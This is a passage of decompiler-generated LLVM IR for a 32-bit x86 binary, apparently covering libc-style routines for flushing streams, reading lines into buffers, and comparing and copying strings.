dec_label_pc_80558ff:                             ; preds = %dec_label_pc_80558ef
  store i32 %v0_80558ff, i32* @esi, align 4
  br label %dec_label_pc_8055924

dec_label_pc_8055903:                             ; preds = %dec_label_pc_80558ef
  %v0_8055903 = load i32, i32* @esi, align 4
  %v1_8055903 = icmp eq i32 %v0_8055903, 0
  %v1_8055905 = icmp eq i1 %v1_8055903, false
  br i1 %v1_8055905, label %dec_label_pc_805590f, label %dec_label_pc_8055907

dec_label_pc_8055907:                             ; preds = %dec_label_pc_8055903
  store i32 %v3_80558f7, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  br label %dec_label_pc_8055912

dec_label_pc_805590f:                             ; preds = %dec_label_pc_8055903
  %v2_805590f = add i32 %v0_8055903, 32
  %v3_805590f = inttoptr i32 %v2_805590f to i32*
  store i32 %v3_80558f7, i32* %v3_805590f, align 4
  %v0_8055912.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055912

dec_label_pc_8055912:                             ; preds = %dec_label_pc_8055907, %dec_label_pc_805590f
  %v0_805591b = phi i32 [ %v0_80558ff, %dec_label_pc_8055907 ], [ %v0_8055912.pre, %dec_label_pc_805590f ]
  %v1_8055912 = add i32 %v0_805591b, 1
  %v2_8055912 = inttoptr i32 %v1_8055912 to i8*
  %v3_8055912 = load i8, i8* %v2_8055912, align 1
  %v4_8055912 = and i8 %v3_8055912, 32
  %v5_8055912 = icmp eq i8 %v4_8055912, 0
  br i1 %v5_8055912, label %dec_label_pc_8055924, label %dec_label_pc_8055918

dec_label_pc_8055918:                             ; preds = %dec_label_pc_8055912
  %v1_805591c = call i32 @function_8052915(i32 %v0_805591b)
  br label %dec_label_pc_8055924

dec_label_pc_8055924:                             ; preds = %dec_label_pc_8055912, %dec_label_pc_80558ff, %dec_label_pc_8055918
  %v0_8055924 = load i32, i32* @ebx, align 4
  store i32 %v0_8055924, i32* %edx.global-to-local, align 4
  %v1_8055926 = icmp eq i32 %v0_8055924, 0
  %v1_8055928 = icmp eq i1 %v1_8055926, false
  br i1 %v1_8055928, label %dec_label_pc_80558ef, label %dec_label_pc_805592a.loopexit

dec_label_pc_805592a.loopexit:                    ; preds = %dec_label_pc_8055924
  br label %dec_label_pc_805592a

dec_label_pc_805592a:                             ; preds = %dec_label_pc_805592a.loopexit, %dec_label_pc_80558c1
  store i32 %v2_80558ce, i32* @eax, align 4
  %v2_8055933 = call i32 @function_80535d2(i32 %v2_80558ce, i32 1)
  store i32 0, i32* @global_var_80618e8.410, align 8
  %v0_8055945.pre = load i32, i32* @global_var_80618e4.409, align 4
  br label %dec_label_pc_8055945

dec_label_pc_8055945:                             ; preds = %dec_label_pc_80558b4, %dec_label_pc_8055880, %dec_label_pc_805592a
  %v0_8055945 = phi i32 [ %v0_80558a5, %dec_label_pc_80558b4 ], [ %v0_80558a5, %dec_label_pc_8055880 ], [ %v0_8055945.pre, %dec_label_pc_805592a ]
  %v1_805594a = add i32 %v0_8055945, -1
  store i32 %v1_805594a, i32* @global_var_80618e4.409, align 4
  store i32 %v2_805588f, i32* @eax, align 4
  %v2_8055959 = call i32 @function_80535d2(i32 %v2_805588f, i32 1)
  ret i32 %v2_8055959

; uselistorder directives
  uselistorder i32 %v0_8055924, { 1, 2, 0 }
  uselistorder i32 %v0_80558ff, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80558a5, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_8052915, { 16, 15, 14, 5, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 1, 0, 19, 18, 17 }
  uselistorder label %dec_label_pc_8055945, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055924, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055912, { 1, 0 }
  uselistorder label %dec_label_pc_80558ef, { 1, 0 }
}

define i32 @function_8055964(i16* %arg1) local_unnamed_addr {
dec_label_pc_8055964:
  %stack_var_-32 = alloca i32, align 4
  %v0_8055964 = load i32, i32* @ebp, align 4
  %v0_8055965 = load i32, i32* @edi, align 4
  %v0_8055966 = load i32, i32* @esi, align 4
  %v0_8055967 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_805596d = ptrtoint i16* %arg1 to i32
  store i32 %v4_805596d, i32* @ebx, align 4
  %v10_8055971 = icmp eq i16* %arg1, inttoptr (i32 134600252 to i16*)
  br i1 %v10_8055971, label %dec_label_pc_8055986, label %dec_label_pc_8055979

dec_label_pc_8055979:                             ; preds = %dec_label_pc_8055964
  store i32 256, i32* @ebp, align 4
  %v2_805597e = icmp eq i16* %arg1, null
  %v1_8055980 = icmp eq i1 %v2_805597e, false
  br i1 %v1_8055980, label %dec_label_pc_8055a75, label %dec_label_pc_8055986

dec_label_pc_8055986:                             ; preds = %dec_label_pc_8055979, %dec_label_pc_8055964
  store i32 0, i32* @edi, align 4
  %v2_8055993 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055993, i32* @ebx, align 4
  %v2_8055998 = call i32 @function_80535d2(i32 %v2_8055993, i32 134559183)
  %v1_80559a4 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  store i32 ptrtoint (i32* @global_var_805d658.308 to i32), i32* @ecx, align 4
  %v0_80559aa = load i32, i32* @global_var_80618e4.409, align 4
  %v1_80559b0 = add i32 %v0_80559aa, 1
  store i32 %v1_80559b0, i32* @eax, align 4
  store i32 %v1_80559b0, i32* @global_var_80618e4.409, align 4
  %v2_80559b9 = call i32 @function_80535d2(i32 %v2_8055993, i32 1)
  store i32 %v2_80559b9, i32* @eax, align 4
  %v2_80559cc = call i32 @function_80535d2(i32 %v2_8055993, i32 134559183)
  %v1_80559d8 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d640.307 to i32))
  store i32 ptrtoint (i32* @global_var_805d640.307 to i32), i32* @eax, align 4
  %v0_80559e1 = load i32, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  store i32 %v0_80559e1, i32* @esi, align 4
  %v2_80559e8 = call i32 @function_80535d2(i32 %v2_8055993, i32 1)
  %v0_8055a6a1 = load i32, i32* @esi, align 4
  %v1_8055a6a2 = icmp eq i32 %v0_8055a6a1, 0
  %v1_8055a6c9 = icmp eq i1 %v1_8055a6a2, false
  br i1 %v1_8055a6c9, label %dec_label_pc_80559f2, label %dec_label_pc_8055a6e

dec_label_pc_80559f2:                             ; preds = %dec_label_pc_8055986, %dec_label_pc_8055a67
  %v0_8055a00 = phi i32 [ %v3_8055a67, %dec_label_pc_8055a67 ], [ %v0_8055a6a1, %dec_label_pc_8055986 ]
  %v1_80559f2 = inttoptr i32 %v0_8055a00 to i8*
  %v2_80559f2 = load i8, i8* %v1_80559f2, align 1
  %v3_80559f2 = and i8 %v2_80559f2, 64
  %v4_80559f2 = icmp eq i8 %v3_80559f2, 0
  br i1 %v4_80559f2, label %dec_label_pc_8055a67, label %dec_label_pc_80559f7

dec_label_pc_80559f7:                             ; preds = %dec_label_pc_80559f2
  %v0_80559f7 = load i32, i32* @global_var_805d670.411, align 16
  %v9_80559f7 = icmp eq i32 %v0_80559f7, 2
  br i1 %v9_80559f7, label %dec_label_pc_8055a1f, label %dec_label_pc_8055a00

dec_label_pc_8055a00:                             ; preds = %dec_label_pc_80559f7
  %v1_8055a00 = add i32 %v0_8055a00, 56
  store i32 %v1_8055a00, i32* @ebx, align 4
  store i32 %v2_8055993, i32* @eax, align 4
  %v2_8055a0f = call i32 @function_80535d2(i32 %v2_8055993, i32 134559183)
  %v0_8055a14 = load i32, i32* @ebx, align 4
  %v1_8055a17 = call i32 @function_80535cf(i32 %v0_8055a14)
  %v1_8055a21.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055a1f

dec_label_pc_8055a1f:                             ; preds = %dec_label_pc_80559f7, %dec_label_pc_8055a00
  %v0_8055a31 = phi i32 [ %v0_8055a00, %dec_label_pc_80559f7 ], [ %v1_8055a21.pre, %dec_label_pc_8055a00 ]
  %v0_8055a1f = load i32, i32* @ebp, align 4
  %v2_8055a21 = inttoptr i32 %v0_8055a31 to i32*
  %v3_8055a21 = load i32, i32* %v2_8055a21, align 4
  %v4_8055a21 = or i32 %v3_8055a21, %v0_8055a1f
  %v2_8055a23 = urem i32 %v4_8055a21, 65536
  %v9_8055a23 = and i32 %v2_8055a23, 832
  %v2_8055a27 = icmp eq i32 %v9_8055a23, 320
  %v1_8055a2c = icmp eq i1 %v2_8055a27, false
  br i1 %v1_8055a2c, label %dec_label_pc_8055a4d, label %dec_label_pc_8055a2e

dec_label_pc_8055a2e:                             ; preds = %dec_label_pc_8055a1f
  %v1_8055a32 = call i32 @function_8050744(i32 %v0_8055a31)
  %v1_8055a3a = icmp eq i32 %v1_8055a32, 0
  br i1 %v1_8055a3a, label %dec_label_pc_8055a43, label %dec_label_pc_8055a3e

dec_label_pc_8055a3e:                             ; preds = %dec_label_pc_8055a2e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8055a4d

dec_label_pc_8055a43:                             ; preds = %dec_label_pc_8055a2e
  %v0_8055a43 = load i32, i32* @esi, align 4
  %v1_8055a43 = inttoptr i32 %v0_8055a43 to i16*
  %v2_8055a43 = load i16, i16* %v1_8055a43, align 2
  %v3_8055a43 = and i16 %v2_8055a43, -65
  store i16 %v3_8055a43, i16* %v1_8055a43, align 2
  %v0_8055a47 = load i32, i32* @esi, align 4
  %v1_8055a47 = add i32 %v0_8055a47, 8
  %v2_8055a47 = inttoptr i32 %v1_8055a47 to i32*
  %v3_8055a47 = load i32, i32* %v2_8055a47, align 4
  %v2_8055a4a = add i32 %v0_8055a47, 28
  %v3_8055a4a = inttoptr i32 %v2_8055a4a to i32*
  store i32 %v3_8055a47, i32* %v3_8055a4a, align 4
  br label %dec_label_pc_8055a4d

dec_label_pc_8055a4d:                             ; preds = %dec_label_pc_8055a1f, %dec_label_pc_8055a3e, %dec_label_pc_8055a43
  %v0_8055a4d = load i32, i32* @global_var_805d670.411, align 16
  %v9_8055a4d = icmp eq i32 %v0_8055a4d, 2
  br i1 %v9_8055a4d, label %dec_label_pc_8055a67, label %dec_label_pc_8055a56

dec_label_pc_8055a56:                             ; preds = %dec_label_pc_8055a4d
  store i32 %v2_8055993, i32* @eax, align 4
  %v2_8055a5f = call i32 @function_80535d2(i32 %v2_8055993, i32 1)
  br label %dec_label_pc_8055a67

dec_label_pc_8055a67:                             ; preds = %dec_label_pc_8055a4d, %dec_label_pc_80559f2, %dec_label_pc_8055a56
  %v0_8055a67 = load i32, i32* @esi, align 4
  %v1_8055a67 = add i32 %v0_8055a67, 32
  %v2_8055a67 = inttoptr i32 %v1_8055a67 to i32*
  %v3_8055a67 = load i32, i32* %v2_8055a67, align 4
  store i32 %v3_8055a67, i32* @esi, align 4
  %v1_8055a6a = icmp eq i32 %v3_8055a67, 0
  %v1_8055a6c = icmp eq i1 %v1_8055a6a, false
  br i1 %v1_8055a6c, label %dec_label_pc_80559f2, label %dec_label_pc_8055a6e

dec_label_pc_8055a6e:                             ; preds = %dec_label_pc_8055a67, %dec_label_pc_8055986
  %v0_8055a6e = call i32 @function_8055880()
  br label %dec_label_pc_8055a9b

dec_label_pc_8055a75:                             ; preds = %dec_label_pc_8055979
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8055a77 = load i8, i8* %tmp23, align 1
  %v4_8055a77 = and i8 %v3_8055a77, 64
  %v5_8055a77 = icmp eq i8 %v4_8055a77, 0
  br i1 %v5_8055a77, label %dec_label_pc_8055a9b, label %dec_label_pc_8055a7c

dec_label_pc_8055a7c:                             ; preds = %dec_label_pc_8055a75
  store i32 -1, i32* @edi, align 4
  %v1_8055a83 = call i32 @function_8050744(i32 %v4_805596d)
  %v1_8055a8b = icmp eq i32 %v1_8055a83, 0
  %v1_8055a8d = icmp eq i1 %v1_8055a8b, false
  br i1 %v1_8055a8d, label %dec_label_pc_8055a9b, label %dec_label_pc_8055a8f

dec_label_pc_8055a8f:                             ; preds = %dec_label_pc_8055a7c
  %v3_8055a8f = load i16, i16* %arg1, align 2
  %v4_8055a8f = and i16 %v3_8055a8f, -65
  store i16 %v4_8055a8f, i16* %arg1, align 2
  %v2_8055a93 = add i32 %v4_805596d, 8
  %v3_8055a93 = inttoptr i32 %v2_8055a93 to i32*
  %v4_8055a93 = load i32, i32* %v3_8055a93, align 4
  %v3_8055a96 = add i32 %v4_805596d, 28
  %v4_8055a96 = inttoptr i32 %v3_8055a96 to i32*
  store i32 %v4_8055a93, i32* %v4_8055a96, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8055a9b

dec_label_pc_8055a9b:                             ; preds = %dec_label_pc_8055a7c, %dec_label_pc_8055a75, %dec_label_pc_8055a6e, %dec_label_pc_8055a8f
  %v0_8055a9e = load i32, i32* @edi, align 4
  store i32 %v0_8055967, i32* @ebx, align 4
  store i32 %v0_8055966, i32* @esi, align 4
  store i32 %v0_8055965, i32* @edi, align 4
  store i32 %v0_8055964, i32* @ebp, align 4
  ret i32 %v0_8055a9e

; uselistorder directives
  uselistorder i32 %v3_8055a67, { 1, 2, 0 }
  uselistorder i32 %v2_8055993, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_8055880, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805d63c.309 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805d640.307 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_80618e4.409, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @function_80535cf, { 25, 24, 23, 22, 21, 20, 19, 18, 27, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 26, 5, 29, 31, 30, 28, 4, 3, 2, 1, 7, 0, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805d658.308 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @function_80535d2, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 47, 46, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 45, 44, 5, 4, 51, 50, 55, 54, 53, 52, 49, 48, 3, 2, 7, 6, 1, 0 }
  uselistorder i32 134559183, { 17, 18, 2, 3, 4, 5, 19, 20, 6, 21, 22, 7, 8, 25, 26, 27, 28, 29, 30, 0, 23, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24 }
  uselistorder i16* %arg1, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8055a9b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055a67, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055a4d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055a1f, { 1, 0 }
  uselistorder label %dec_label_pc_80559f2, { 1, 0 }
}

define i32 @function_8055aa8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055aa8:
  %eax.global-to-local = alloca i32, align 4
  %v0_8055aa8 = load i32, i32* @ebp, align 4
  %v4_8055aaf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055aaf, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8055aaf, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8055af9.preheader, label %dec_label_pc_8055b05

dec_label_pc_8055af9.preheader:                   ; preds = %dec_label_pc_8055aa8
  %v1_8055af919 = add i32 %arg2, -1
  %v8_8055af920 = icmp eq i32 %v1_8055af919, 0
  store i32 %v1_8055af919, i32* @esi, align 4
  %v1_8055afa21 = icmp eq i1 %v8_8055af920, false
  br i1 %v1_8055afa21, label %dec_label_pc_8055ac3, label %dec_label_pc_8055afc

dec_label_pc_8055ac3:                             ; preds = %dec_label_pc_8055af9.preheader, %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge.dec_label_pc_8055ac3_crit_edge
  %v0_8055ac3 = phi i32 [ %v0_8055ac3.pre, %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge.dec_label_pc_8055ac3_crit_edge ], [ %arg3, %dec_label_pc_8055af9.preheader ]
  %v1_8055ac3 = add i32 %v0_8055ac3, 16
  %v2_8055ac3 = inttoptr i32 %v1_8055ac3 to i32*
  %v3_8055ac3 = load i32, i32* %v2_8055ac3, align 4
  store i32 %v3_8055ac3, i32* %eax.global-to-local, align 4
  %v2_8055ac6 = add i32 %v0_8055ac3, 24
  %v3_8055ac6 = inttoptr i32 %v2_8055ac6 to i32*
  %v4_8055ac6 = load i32, i32* %v3_8055ac6, align 4
  %v10_8055ac6 = icmp ult i32 %v3_8055ac3, %v4_8055ac6
  %v1_8055ac9 = icmp eq i1 %v10_8055ac6, false
  br i1 %v1_8055ac9, label %dec_label_pc_8055ad9, label %dec_label_pc_8055acb

dec_label_pc_8055acb:                             ; preds = %dec_label_pc_8055ac3
  %v1_8055acb = inttoptr i32 %v3_8055ac3 to i8*
  %v2_8055acb = load i8, i8* %v1_8055acb, align 1
  %v3_8055acb = zext i8 %v2_8055acb to i32
  %v4_8055acb = load i32, i32* @edx, align 4
  %v5_8055acb = and i32 %v4_8055acb, -256
  %v6_8055acb = or i32 %v5_8055acb, %v3_8055acb
  store i32 %v6_8055acb, i32* @edx, align 4
  %v1_8055acd = add i32 %v3_8055ac3, 1
  store i32 %v1_8055acd, i32* %eax.global-to-local, align 4
  %v2_8055ace = load i32, i32* @ebx, align 4
  %v3_8055ace = inttoptr i32 %v2_8055ace to i8*
  store i8 %v2_8055acb, i8* %v3_8055ace, align 1
  %v0_8055ad0 = load i32, i32* @ebx, align 4
  %v1_8055ad0 = add i32 %v0_8055ad0, 1
  store i32 %v1_8055ad0, i32* @ebx, align 4
  %v0_8055ad1 = load i32, i32* @edx, align 4
  %v1_8055ad1 = trunc i32 %v0_8055ad1 to i8
  %v10_8055ad1 = icmp eq i8 %v1_8055ad1, 10
  %v0_8055ad4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055ad4 = load i32, i32* @ebp, align 4
  %v2_8055ad4 = add i32 %v1_8055ad4, 16
  %v3_8055ad4 = inttoptr i32 %v2_8055ad4 to i32*
  store i32 %v0_8055ad4, i32* %v3_8055ad4, align 4
  br i1 %v10_8055ad1, label %dec_label_pc_8055afc, label %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge

dec_label_pc_8055ad9:                             ; preds = %dec_label_pc_8055ac3
  %v0_8055add = call i32 @function_80567b4()
  %v1_8055add = trunc i32 %v0_8055add to i8
  store i32 %v0_8055add, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8055add, 256
  %v11_8055ae5 = icmp eq i32 %sext.mask, 255
  %v1_8055ae8 = icmp eq i1 %v11_8055ae5, false
  br i1 %v1_8055ae8, label %dec_label_pc_8055af7, label %dec_label_pc_8055aea

dec_label_pc_8055aea:                             ; preds = %dec_label_pc_8055ad9
  %v0_8055aea = load i32, i32* @ebp, align 4
  %v1_8055aea = inttoptr i32 %v0_8055aea to i8*
  %v2_8055aea = load i8, i8* %v1_8055aea, align 1
  %v3_8055aea = and i8 %v2_8055aea, 8
  %v4_8055aea = icmp eq i8 %v3_8055aea, 0
  br i1 %v4_8055aea, label %dec_label_pc_8055afc, label %dec_label_pc_8055b05

dec_label_pc_8055af7:                             ; preds = %dec_label_pc_8055ad9
  %v3_8055af2 = load i32, i32* @ebx, align 4
  %v4_8055af2 = inttoptr i32 %v3_8055af2 to i8*
  store i8 %v1_8055add, i8* %v4_8055af2, align 1
  %v0_8055af4 = load i32, i32* @ebx, align 4
  %v1_8055af4 = add i32 %v0_8055af4, 1
  store i32 %v1_8055af4, i32* @ebx, align 4
  %v11_8055af5 = icmp eq i8 %v1_8055add, 10
  br i1 %v11_8055af5, label %dec_label_pc_8055afc, label %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge

dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge: ; preds = %dec_label_pc_8055acb, %dec_label_pc_8055af7
  %v0_8055af9.pre = load i32, i32* @esi, align 4
  %v1_8055af9 = add i32 %v0_8055af9.pre, -1
  %v8_8055af9 = icmp eq i32 %v1_8055af9, 0
  store i32 %v1_8055af9, i32* @esi, align 4
  %v1_8055afa = icmp eq i1 %v8_8055af9, false
  br i1 %v1_8055afa, label %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge.dec_label_pc_8055ac3_crit_edge, label %dec_label_pc_8055afc

dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge.dec_label_pc_8055ac3_crit_edge: ; preds = %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge
  %v0_8055ac3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8055ac3

dec_label_pc_8055afc:                             ; preds = %dec_label_pc_8055af9.preheader, %dec_label_pc_8055acb, %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge, %dec_label_pc_8055af7, %dec_label_pc_8055aea
  %v0_8055afc = load i32, i32* @ebx, align 4
  %v1_8055afc = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8055afc, %v1_8055afc
  br i1 %tmp23, label %dec_label_pc_8055b00, label %dec_label_pc_8055b05

dec_label_pc_8055b00:                             ; preds = %dec_label_pc_8055afc
  %v1_8055b00 = inttoptr i32 %v0_8055afc to i8*
  store i8 0, i8* %v1_8055b00, align 1
  %v0_8055b0a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055b07

dec_label_pc_8055b05:                             ; preds = %dec_label_pc_8055afc, %dec_label_pc_8055aea, %dec_label_pc_8055aa8
  br label %dec_label_pc_8055b07

dec_label_pc_8055b07:                             ; preds = %dec_label_pc_8055b00, %dec_label_pc_8055b05
  %v0_8055b0a = phi i32 [ %v0_8055b0a.pre, %dec_label_pc_8055b00 ], [ 0, %dec_label_pc_8055b05 ]
  store i32 %v0_8055b0a, i32* %eax.global-to-local, align 4
  store i32 %v0_8055aa8, i32* @ebp, align 4
  ret i32 %v0_8055b0a

; uselistorder directives
  uselistorder i32 %v0_8055b0a, { 1, 0 }
  uselistorder i32 %v0_8055afc, { 1, 0 }
  uselistorder i32 %v1_8055af9, { 1, 0 }
  uselistorder i32 %v0_8055add, { 0, 2, 1 }
  uselistorder i32 %v0_8055ac3, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder label %dec_label_pc_8055b07, { 1, 0 }
  uselistorder label %dec_label_pc_8055afc, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8055af7.dec_label_pc_8055af9_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8055ac3, { 1, 0 }
}

define i32 @function_8055b14(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055b14:
  %v4_8055b16 = ptrtoint i8* %arg1 to i32
  %v4_8055b1e.pre = load i32, i32* @eax, align 4
  %v8_8055b1e.pre = load i1, i1* @df, align 1
  %v9_8055b1e = select i1 %v8_8055b1e.pre, i32 -1, i32 1
  br label %dec_label_pc_8055b1e

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055b22, %dec_label_pc_8055b14
  %v20_8055b1f = phi i32 [ %v23_8055b1f, %dec_label_pc_8055b22 ], [ %arg2, %dec_label_pc_8055b14 ]
  %v4_8055b1e = phi i32 [ %v6_8055b1e, %dec_label_pc_8055b22 ], [ %v4_8055b1e.pre, %dec_label_pc_8055b14 ]
  %v7_8055b1e = phi i32 [ %v10_8055b1e, %dec_label_pc_8055b22 ], [ %v4_8055b16, %dec_label_pc_8055b14 ]
  %v1_8055b1e = inttoptr i32 %v7_8055b1e to i8*
  %v2_8055b1e = load i8, i8* %v1_8055b1e, align 1
  %v3_8055b1f = inttoptr i32 %v20_8055b1f to i8*
  %v4_8055b1f = load i8, i8* %v3_8055b1f, align 1
  %v15_8055b1f = icmp eq i8 %v2_8055b1e, %v4_8055b1f
  %v1_8055b20 = icmp eq i1 %v15_8055b1f, false
  br i1 %v1_8055b20, label %dec_label_pc_8055b2a, label %dec_label_pc_8055b22

dec_label_pc_8055b22:                             ; preds = %dec_label_pc_8055b1e
  %v23_8055b1f = add i32 %v20_8055b1f, %v9_8055b1e
  %v10_8055b1e = add i32 %v7_8055b1e, %v9_8055b1e
  %v3_8055b1e = zext i8 %v2_8055b1e to i32
  %v5_8055b1e = and i32 %v4_8055b1e, -256
  %v6_8055b1e = or i32 %v3_8055b1e, %v5_8055b1e
  %v4_8055b22 = icmp eq i8 %v2_8055b1e, 0
  %v1_8055b24 = icmp eq i1 %v4_8055b22, false
  br i1 %v1_8055b24, label %dec_label_pc_8055b1e, label %dec_label_pc_8055b2e

dec_label_pc_8055b2a:                             ; preds = %dec_label_pc_8055b1e
  br label %dec_label_pc_8055b2e

dec_label_pc_8055b2e:                             ; preds = %dec_label_pc_8055b22, %dec_label_pc_8055b2a
  %storemerge = phi i32 [ 1, %dec_label_pc_8055b2a ], [ 0, %dec_label_pc_8055b22 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8055b1e, { 1, 2, 0 }
  uselistorder i32 %v9_8055b1e, { 1, 0 }
  uselistorder label %dec_label_pc_8055b2e, { 1, 0 }
}

define i32 @function_8055b34() local_unnamed_addr {
dec_label_pc_8055b34:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055b35 = load i32, i32* @esi, align 4
  store i32 %v0_8055b35, i32* %stack_var_-8, align 4
  %v4_8055b36 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8055b36, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8055b43 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8055b47 = call i32 @_strlen(i8* %v4_8055b43)
  %v2_8055b49 = add i32 %tmp, -1
  store i32 %v2_8055b49, i32* %edi.global-to-local, align 4
  %v0_8055b4a = load i32, i32* %edx.global-to-local, align 4
  %v8_8055b4d10 = icmp eq i32 %v0_8055b4a, 0
  store i32 %v0_8055b4a, i32* %ecx.global-to-local, align 4
  br i1 %v8_8055b4d10, label %dec_label_pc_8055b58, label %dec_label_pc_8055b50.lr.ph

dec_label_pc_8055b50.lr.ph:                       ; preds = %dec_label_pc_8055b34
  %v4_8055b50.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8055b50.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8055b50

dec_label_pc_8055b50:                             ; preds = %dec_label_pc_8055b50.lr.ph, %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge
  %v8_8055b50 = phi i1 [ %v8_8055b50.pre, %dec_label_pc_8055b50.lr.ph ], [ %v5_8055b51, %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge ]
  %v4_8055b50 = phi i32 [ %v4_8055b50.pre, %dec_label_pc_8055b50.lr.ph ], [ %v0_8055b52, %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge ]
  %v2_8055b5a11 = phi i32 [ %v2_8055b49, %dec_label_pc_8055b50.lr.ph ], [ %v7_8055b51, %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge ]
  %v0_8055b50 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055b50 = inttoptr i32 %v0_8055b50 to i8*
  %v2_8055b50 = load i8, i8* %v1_8055b50, align 1
  %v3_8055b50 = zext i8 %v2_8055b50 to i32
  %v5_8055b50 = and i32 %v4_8055b50, -256
  %v6_8055b50 = or i32 %v5_8055b50, %v3_8055b50
  store i32 %v6_8055b50, i32* %eax.global-to-local, align 4
  %v9_8055b50 = select i1 %v8_8055b50, i32 -1, i32 1
  %v10_8055b50 = add i32 %v9_8055b50, %v0_8055b50
  store i32 %v10_8055b50, i32* %esi.global-to-local, align 4
  %v3_8055b51 = inttoptr i32 %v2_8055b5a11 to i8*
  store i8 %v2_8055b50, i8* %v3_8055b51, align 1
  %v4_8055b51 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055b51 = load i1, i1* @df, align 1
  %v6_8055b51 = select i1 %v5_8055b51, i32 -1, i32 1
  %v7_8055b51 = add i32 %v6_8055b51, %v4_8055b51
  store i32 %v7_8055b51, i32* %edi.global-to-local, align 4
  %v0_8055b52 = load i32, i32* %eax.global-to-local, align 4
  %v3_8055b52 = trunc i32 %v0_8055b52 to i8
  %v4_8055b52 = icmp eq i8 %v3_8055b52, 0
  %v1_8055b54 = icmp eq i1 %v4_8055b52, false
  br i1 %v1_8055b54, label %dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge, label %dec_label_pc_8055b5b

dec_label_pc_8055b50.dec_label_pc_8055b4d_crit_edge: ; preds = %dec_label_pc_8055b50
  %v0_8055b4d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055b4d = add i32 %v0_8055b4d.pre, -1
  %v8_8055b4d = icmp eq i32 %v1_8055b4d, 0
  store i32 %v1_8055b4d, i32* %ecx.global-to-local, align 4
